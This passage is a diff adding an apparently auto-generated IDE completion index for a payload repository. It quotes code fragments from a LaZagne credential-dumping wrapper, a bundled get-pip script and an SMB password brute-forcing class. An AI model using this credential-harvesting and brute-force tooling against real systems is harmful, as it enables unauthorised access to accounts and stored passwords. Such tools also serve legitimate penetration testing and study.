@@ -1,0 +1,1246 @@
+[
+    {
+        "label": "os.path",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os.path",
+        "description": "os.path",
+        "detail": "os.path",
+        "documentation": {}
+    },
+    {
+        "label": "join",
+        "importPath": "os.path",
+        "description": "os.path",
+        "isExtraImport": true,
+        "detail": "os.path",
+        "documentation": {}
+    },
+    {
+        "label": "pkgutil",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "pkgutil",
+        "description": "pkgutil",
+        "detail": "pkgutil",
+        "documentation": {}
+    },
+    {
+        "label": "shutil",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "shutil",
+        "description": "shutil",
+        "detail": "shutil",
+        "documentation": {}
+    },
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "struct",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "struct",
+        "description": "struct",
+        "detail": "struct",
+        "documentation": {}
+    },
+    {
+        "label": "tempfile",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "tempfile",
+        "description": "tempfile",
+        "detail": "tempfile",
+        "documentation": {}
+    },
+    {
+        "label": "argparse",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "argparse",
+        "description": "argparse",
+        "detail": "argparse",
+        "documentation": {}
+    },
+    {
+        "label": "logging",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "logging",
+        "description": "logging",
+        "detail": "logging",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "curdir",
+        "importPath": "os",
+        "description": "os",
+        "isExtraImport": true,
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "time",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "time",
+        "description": "time",
+        "detail": "time",
+        "documentation": {}
+    },
+    {
+        "label": "write_in_file",
+        "importPath": "lazagne.config.write_output",
+        "description": "lazagne.config.write_output",
+        "isExtraImport": true,
+        "detail": "lazagne.config.write_output",
+        "documentation": {}
+    },
+    {
+        "label": "StandardOutput",
+        "importPath": "lazagne.config.write_output",
+        "description": "lazagne.config.write_output",
+        "isExtraImport": true,
+        "detail": "lazagne.config.write_output",
+        "documentation": {}
+    },
+    {
+        "label": "get_categories",
+        "importPath": "lazagne.config.manage_modules",
+        "description": "lazagne.config.manage_modules",
+        "isExtraImport": true,
+        "detail": "lazagne.config.manage_modules",
+        "documentation": {}
+    },
+    {
+        "label": "constant",
+        "importPath": "lazagne.config.constant",
+        "description": "lazagne.config.constant",
+        "isExtraImport": true,
+        "detail": "lazagne.config.constant",
+        "documentation": {}
+    },
+    {
+        "label": "run_lazagne",
+        "importPath": "lazagne.config.run",
+        "description": "lazagne.config.run",
+        "isExtraImport": true,
+        "detail": "lazagne.config.run",
+        "documentation": {}
+    },
+    {
+        "label": "create_module_dic",
+        "importPath": "lazagne.config.run",
+        "description": "lazagne.config.run",
+        "isExtraImport": true,
+        "detail": "lazagne.config.run",
+        "documentation": {}
+    },
+    {
+        "label": "datetime",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "datetime",
+        "description": "datetime",
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
+        "label": "BaseHTTPRequestHandler",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "HTTPServer",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "BaseHTTPRequestHandler",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "HTTPServer",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "BaseHTTPRequestHandler",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "HTTPServer",
+        "importPath": "BaseHTTPServer",
+        "description": "BaseHTTPServer",
+        "isExtraImport": true,
+        "detail": "BaseHTTPServer",
+        "documentation": {}
+    },
+    {
+        "label": "sys,",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys.",
+        "description": "sys.",
+        "detail": "sys.",
+        "documentation": {}
+    },
+    {
+        "label": "os.path,",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os.path.",
+        "description": "os.path.",
+        "detail": "os.path.",
+        "documentation": {}
+    },
+    {
+        "label": "os,",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os.",
+        "description": "os.",
+        "detail": "os.",
+        "documentation": {}
+    },
+    {
+        "label": "absolute_import",
+        "importPath": "__future__",
+        "description": "__future__",
+        "isExtraImport": true,
+        "detail": "__future__",
+        "documentation": {}
+    },
+    {
+        "label": "base64",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "base64",
+        "description": "base64",
+        "detail": "base64",
+        "documentation": {}
+    },
+    {
+        "label": "binascii",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "binascii",
+        "description": "binascii",
+        "detail": "binascii",
+        "documentation": {}
+    },
+    {
+        "label": "open",
+        "importPath": "io",
+        "description": "io",
+        "isExtraImport": true,
+        "detail": "io",
+        "documentation": {}
+    },
+    {
+        "label": "bootstrap",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.get-pip",
+        "description": "payloads.library.credentials.MacPass.get-pip",
+        "peekOfCode": "def bootstrap(tmpdir=None):\n    # Import pip so we can use it to install pip and maybe setuptools too\n    from pip._internal.cli.main import main as pip_entry_point\n    from pip._internal.commands.install import InstallCommand\n    from pip._internal.req.constructors import install_req_from_line\n    # Wrapper to provide default certificate with the lowest priority\n    # Due to pip._internal.commands.commands_dict structure, a monkeypatch\n    # seems the simplest workaround.\n    install_parse_args = InstallCommand.parse_args\n    def cert_parse_args(self, args):",
+        "detail": "payloads.library.credentials.MacPass.get-pip",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.get-pip",
+        "description": "payloads.library.credentials.MacPass.get-pip",
+        "peekOfCode": "def main():\n    tmpdir = None\n    try:\n        # Create a temporary working directory\n        tmpdir = tempfile.mkdtemp()\n        # Unpack the zipfile into the temporary directory\n        pip_zip = os.path.join(tmpdir, \"pip.zip\")\n        with open(pip_zip, \"wb\") as fp:\n            fp.write(b85decode(DATA.replace(b\"\\n\", b\"\")))\n        # Add the zipfile to sys.path so that we can import it",
+        "detail": "payloads.library.credentials.MacPass.get-pip",
+        "documentation": {}
+    },
+    {
+        "label": "PY2",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.MacPass.get-pip",
+        "description": "payloads.library.credentials.MacPass.get-pip",
+        "peekOfCode": "PY2 = sys.version_info[0] == 2\nPY3 = sys.version_info[0] == 3\nif PY3:\n    iterbytes = iter\nelse:\n    def iterbytes(buf):\n        return (ord(byte) for byte in buf)\ntry:\n    from base64 import b85decode\nexcept ImportError:",
+        "detail": "payloads.library.credentials.MacPass.get-pip",
+        "documentation": {}
+    },
+    {
+        "label": "PY3",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.MacPass.get-pip",
+        "description": "payloads.library.credentials.MacPass.get-pip",
+        "peekOfCode": "PY3 = sys.version_info[0] == 3\nif PY3:\n    iterbytes = iter\nelse:\n    def iterbytes(buf):\n        return (ord(byte) for byte in buf)\ntry:\n    from base64 import b85decode\nexcept ImportError:\n    _b85alphabet = (b\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"",
+        "detail": "payloads.library.credentials.MacPass.get-pip",
+        "documentation": {}
+    },
+    {
+        "label": "DATA",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.MacPass.get-pip",
+        "description": "payloads.library.credentials.MacPass.get-pip",
+        "peekOfCode": "DATA = b\"\"\"\nP)h>@6aWAK2mq6<QBhda4EG}e0074U000jF003}la4%n9X>MtBUtcb8d2NtyYr-%Phu`N@9Nmj4xO9l\nHO>i(|e`H&gvAqzH5bae1Z4z?VNx%J4r5gi7-sG3#xx1$bt^#koRK_v}t4mq4DM@nUjopE%ybBEP%f(\nVnUmmBg>f<ZRX4$h4rZ^Li1;kUd)c=GxLp*@FXX9cMA%s%j7%0A!f(azUYdMsoB!1*rK&6fC>9C_o<}\nCJ4)Qc90W9W61RSR7ahxNJ-SN9NCI2I;J^0_wz@oEd*V(_q-fwN@;6>7^+xBxXFY?@ZUC4oCw*g8wDM\n4)Xjo=J)$@F|w+JU6GdkR$8pXaIx=duC7LG~F5A*BiNYRq7kB)5uH>QH_+|jP7n_H`$+{bK22zXuOLl\nb>`F|XzwwcMhVDuu)pC^QeXT4P)h>@6aWAK2mq6<QBi0J4?Nfb0055z000jF003}la4%n9ZDDC{Utcb\n8d0kS$j+`(Iz4H~8<^WVIJLgqrr5<}-^;T6;8q5#@Ng9Wt^y_P9ptD;}#IfIdelLCWGbq(BX^E&5*g5\n!^K>s8^EeX~AToilV)A2_e6~zhOaP~KZvIOlqFiVW+60AOs)?J~q5l!-OgI;*jfY94W3Aib4Jnnk|YJ\n*Ng1Ga|{kpv)l&^K>8SV(XV+<$mHY8?a{!1#G)Y63H$85<@-{DTbUDCucxV6x07;%M+|!-MO9j<0Wi#",
+        "detail": "payloads.library.credentials.MacPass.get-pip",
+        "documentation": {}
+    },
+    {
+        "label": "output",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def output(output_dir=None, txt_format=False, json_format=False, all_format=False):\n    if output_dir:\n        if os.path.isdir(output_dir):\n            constant.folder_name = output_dir\n        else:\n            print('[!] Specify a directory, not a file !')\n    if txt_format:\n        constant.output = 'txt'\n    if json_format:\n        constant.output = 'json'",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "quiet_mode",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def quiet_mode(is_quiet_mode=False):\n    if is_quiet_mode:\n        constant.quiet_mode = True\ndef verbosity(verbose=0):\n    # Write on the console + debug file\n    if verbose == 0:\n        level = logging.CRITICAL\n    elif verbose == 1:\n        level = logging.INFO\n    elif verbose >= 2:",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "verbosity",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def verbosity(verbose=0):\n    # Write on the console + debug file\n    if verbose == 0:\n        level = logging.CRITICAL\n    elif verbose == 1:\n        level = logging.INFO\n    elif verbose >= 2:\n        level = logging.DEBUG\n    formatter = logging.Formatter(fmt='%(message)s')\n    stream = logging.StreamHandler(sys.stdout)",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "manage_advanced_options",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def manage_advanced_options(user_password=None, dictionary_attack=None):\n    if user_password:\n        constant.user_password = user_password\n    if dictionary_attack:\n        constant.dictionary_attack = dictionary_attack\ndef clean_args(arg):\n    \"\"\"\n    Remove not necessary values to get only subcategories\n    \"\"\"\n    for i in ['output', 'write_normal', 'write_json', 'write_all', 'verbose', 'auditType', 'quiet']:",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "clean_args",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def clean_args(arg):\n    \"\"\"\n    Remove not necessary values to get only subcategories\n    \"\"\"\n    for i in ['output', 'write_normal', 'write_json', 'write_all', 'verbose', 'auditType', 'quiet']:\n        try:\n            del arg[i]\n        except Exception:\n            pass\n    return arg",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "runLaZagne",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "def runLaZagne(category_selected='all', subcategories={}, password=None, interactive=False):\n    \"\"\"\n    This function will be removed, still there for compatibility with other tools\n    Everything is on the config/run.py file\n    \"\"\"\n    yield from run_lazagne(\n        category_selected=category_selected,\n        subcategories=subcategories,\n        password=password,\n        interactive=interactive,",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "constant.st",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "constant.st = StandardOutput()\nmodules = create_module_dic()\ndef output(output_dir=None, txt_format=False, json_format=False, all_format=False):\n    if output_dir:\n        if os.path.isdir(output_dir):\n            constant.folder_name = output_dir\n        else:\n            print('[!] Specify a directory, not a file !')\n    if txt_format:\n        constant.output = 'txt'",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "modules",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.MacPass.laZagne",
+        "description": "payloads.library.credentials.MacPass.laZagne",
+        "peekOfCode": "modules = create_module_dic()\ndef output(output_dir=None, txt_format=False, json_format=False, all_format=False):\n    if output_dir:\n        if os.path.isdir(output_dir):\n            constant.folder_name = output_dir\n        else:\n            print('[!] Specify a directory, not a file !')\n    if txt_format:\n        constant.output = 'txt'\n    if json_format:",
+        "detail": "payloads.library.credentials.MacPass.laZagne",
+        "documentation": {}
+    },
+    {
+        "label": "MMCBrute",
+        "kind": 6,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "class MMCBrute(object):\n\tdef __init__(self, usernames, passwords, domain, target, user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):\n\t\tself.usernames = open(usernames, 'r')\n\t\tself.len_usernames = sum((1 for _ in self.usernames))\n\t\tself.usernames.seek(os.SEEK_SET)\n\t\tself.domain = domain\n\t\tself.target = target\n\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "is_readable_file",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "def is_readable_file(path):\n\treturn os.path.isfile(path) and os.access(path, os.R_OK)\nclass MMCBrute(object):\n\tdef __init__(self, usernames, passwords, domain, target, user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):\n\t\tself.usernames = open(usernames, 'r')\n\t\tself.len_usernames = sum((1 for _ in self.usernames))\n\t\tself.usernames.seek(os.SEEK_SET)\n\t\tself.domain = domain\n\t\tself.target = target\n\t\tself.honeybadger = honeybadger",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.usernames",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.usernames = open(usernames, 'r')\n\t\tself.len_usernames = sum((1 for _ in self.usernames))\n\t\tself.usernames.seek(os.SEEK_SET)\n\t\tself.domain = domain\n\t\tself.target = target\n\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.len_usernames",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.len_usernames = sum((1 for _ in self.usernames))\n\t\tself.usernames.seek(os.SEEK_SET)\n\t\tself.domain = domain\n\t\tself.target = target\n\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.domain",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.domain = domain\n\t\tself.target = target\n\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.target",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.target = target\n\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.honeybadger",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.honeybadger = honeybadger\n\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.verbose",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.verbose = verbose\n\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.user_as_pass",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.user_as_pass = user_as_pass\n\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.log",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))\n\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:\n\t\t\t\tself.passwords = False",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.count",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.count = 0\n\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:\n\t\t\t\tself.passwords = False\n\t\t\tself.len_passwords += 1",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.len_passwords",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.len_passwords = 0\n\t\tif passwords is not None:\n\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:\n\t\t\t\tself.passwords = False\n\t\t\tself.len_passwords += 1\n\t\tself.totals = self.len_usernames * self.len_passwords",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tself.passwords",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\tself.passwords = open(passwords, 'r')\n\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:\n\t\t\t\tself.passwords = False\n\t\t\tself.len_passwords += 1\n\t\tself.totals = self.len_usernames * self.len_passwords\n\t@classmethod\n\tdef from_args(cls, args):",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tself.len_passwords",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\tself.len_passwords = sum((1 for _ in self.passwords))\n\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\tif self.user_as_pass:\n\t\t\tif passwords is None:\n\t\t\t\tself.passwords = False\n\t\t\tself.len_passwords += 1\n\t\tself.totals = self.len_usernames * self.len_passwords\n\t@classmethod\n\tdef from_args(cls, args):\n\t\treturn cls(args.usernames, args.passwords, args.domain, args.target, args.uap, args.hb, args.verbose, args.loglvl)",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\tself.passwords",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\t\tself.passwords = False\n\t\t\tself.len_passwords += 1\n\t\tself.totals = self.len_usernames * self.len_passwords\n\t@classmethod\n\tdef from_args(cls, args):\n\t\treturn cls(args.usernames, args.passwords, args.domain, args.target, args.uap, args.hb, args.verbose, args.loglvl)\n\tdef update_progress(self):\n\t\tself.count += 1\n\t\tsys.stdout.write(\"Progress: {0}/{1} ({2}%)  \\r\".format(self.count, self.totals, (100 * self.count / self.totals)))\n\t\tsys.stdout.flush()",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tself.totals",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tself.totals = self.len_usernames * self.len_passwords\n\t@classmethod\n\tdef from_args(cls, args):\n\t\treturn cls(args.usernames, args.passwords, args.domain, args.target, args.uap, args.hb, args.verbose, args.loglvl)\n\tdef update_progress(self):\n\t\tself.count += 1\n\t\tsys.stdout.write(\"Progress: {0}/{1} ({2}%)  \\r\".format(self.count, self.totals, (100 * self.count / self.totals)))\n\t\tsys.stdout.flush()\n\tdef run(self):\n\t\tsmb_connection = SMBConnection(self.target, self.target)",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tsmb_connection",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tsmb_connection = SMBConnection(self.target, self.target)\n\t\tfor user in enumerate(self.usernames):\n\t\t\tuser = user[-1].strip()\n\t\t\tif self.user_as_pass:\n\t\t\t\tself.update_progress()\n\t\t\t\tif next_user := self.login(self.domain, user, user, smb_connection):\n\t\t\t\t\t# Restablish smb_connection to avoid false positves\n\t\t\t\t\tsmb_connection.close()\n\t\t\t\t\tsmb_connection = SMBConnection(self.target, self.target)\n\t\t\t\t\tcontinue",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tuser",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\tuser = user[-1].strip()\n\t\t\tif self.user_as_pass:\n\t\t\t\tself.update_progress()\n\t\t\t\tif next_user := self.login(self.domain, user, user, smb_connection):\n\t\t\t\t\t# Restablish smb_connection to avoid false positves\n\t\t\t\t\tsmb_connection.close()\n\t\t\t\t\tsmb_connection = SMBConnection(self.target, self.target)\n\t\t\t\t\tcontinue\n\t\t\tif self.passwords:\n\t\t\t\tself.passwords.seek(os.SEEK_SET)",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\t\tsmb_connection",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\t\t\tsmb_connection = SMBConnection(self.target, self.target)\n\t\t\t\t\tcontinue\n\t\t\tif self.passwords:\n\t\t\t\tself.passwords.seek(os.SEEK_SET)\n\t\t\t\tfor password in enumerate(self.passwords):\n\t\t\t\t\tself.update_progress()\n\t\t\t\t\tif next_user := self.login(\n\t\t\t\t\t\tself.domain, user, password[-1].strip(), smb_connection\n\t\t\t\t\t):\n\t\t\t\t\t\t# Restablish smb_connection to avoid false positves",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\t\t\tsmb_connection",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
